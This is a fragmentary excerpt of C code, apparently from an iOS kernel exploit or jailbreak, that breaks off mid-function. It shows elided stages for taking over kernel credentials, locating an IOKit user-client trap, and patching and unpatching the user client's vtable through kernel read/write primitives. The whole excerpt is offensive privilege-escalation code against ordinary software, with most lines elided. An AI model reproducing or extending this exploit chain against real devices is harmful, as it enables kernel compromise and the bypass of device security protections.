...
assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
	uint64_t proc_self = kernel_get_proc_for_task(current_task_OOB);
    uint64_t kernel_proc = kernProc_OOB;//kernel_get_proc_for_task(kernel_task);
...
stage0_find_user_client_trap() {
	...
	bool ok = kernel_ipc_port_lookup(current_task_OOB, connection, &user_client_port, NULL);
	assert(ok);
...
stage2_copyout_user_client_vtable() {
	...
	kreadSP(original_vtable_xpac, vtable_contents, max_vtable_size);
...
stage2_patch_user_client(uint64_t *vtable, size_t count) {
	...
	kwriteSP(kernel_buffer, vtable, count * sizeof(*vtable));
	...
	wk64SP(user_client, vtable_pointer);
}
...
stage2_unpatch_user_client() {
	...
	wk64SP(user_client, original_vtable);
}
...
stage1_kernel_call_deinit() {
	if (trap != 0) {
		...
		kwriteSP(trap, trap_data, SIZE(IOExternalTrap));
		trap = 0;
	}
	if (kernel_buffer != 0) {
